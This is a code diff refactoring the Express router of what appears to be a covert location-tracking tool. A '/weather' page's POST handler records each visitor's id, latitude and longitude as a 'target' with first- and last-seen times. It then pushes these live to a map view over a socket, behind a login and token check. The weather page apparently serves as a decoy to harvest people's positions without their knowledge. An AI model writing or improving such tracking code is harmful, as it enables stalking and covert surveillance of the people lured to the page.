@@ -1,10 +1,8 @@
 const express = require("express")
 const router = express.Router()
 const config = require("./config")
-const { loadTargets, saveTargets } = require("./storage")
 
-
-const TARGETS = loadTargets()
+module.exports = function createRouter(TARGETS, updateTarget) {
 
 // login page 
 router.route("/login").get((req, res) => {
@@ -21,41 +19,38 @@ router.route("/login").get((req, res) => {
 
 router.route("/weather").get((req, res) => {
     res.render("weather")
-}).post((req, res) => {
+}).post(async (req, res) => {
     const { id, lat, lng } = req.body
     if (typeof id !== "string" || id.length === 0 || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
         return res.status(400).send("Invalid location data")
     }
 
     const now = new Date().toISOString()
-    const isNewTarget = TARGETS[id] == null
+    try {
+        const target = await updateTarget(id, [Number(lat), Number(lng)], now)
+        const isNewTarget = TARGETS[id] == null
+        TARGETS[id] = target
 
-    if (isNewTarget) {
-        TARGETS[id] = {
-            location: [Number(lat), Number(lng)],
-            firstSeen: now,
-            lastSeen: now,
+        if (isNewTarget) {
+            IO.emit("user-connected", {
+                id,
+                firstSeen: target.firstSeen,
+                lastSeen: target.lastSeen,
+            })
         }
-    } else {
-        TARGETS[id].location = [Number(lat), Number(lng)]
-        TARGETS[id].lastSeen = now
+        IO.emit("map-data", {
+            id,
+            lat,
+            lng,
+            firstSeen: target.firstSeen,
+            lastSeen: target.lastSeen,
+        })
+        res.send("OK")
+        console.log(`> ${id} - ${target.location} - ${now}`)
+    } catch (error) {
+        console.error("Unable to save target location:", error)
+        res.status(503).send("Unable to save location")
     }
-
-    saveTargets(TARGETS)
-    IO.emit("user-connected", {
-        id,
-        firstSeen: TARGETS[id].firstSeen,
-        lastSeen: TARGETS[id].lastSeen,
-    })
-    IO.emit("map-data", {
-        id,
-        lat,
-        lng,
-        firstSeen: TARGETS[id].firstSeen,
-        lastSeen: TARGETS[id].lastSeen,
-    })
-    res.send("OK")
-    console.log(`> ${id} - ${TARGETS[id].location} - ${now}`)
 })
 
 // token checking
@@ -83,4 +78,5 @@ router.route("/map").get((req, res) => {
 })
 
 
-module.exports = router
+    return router
+}
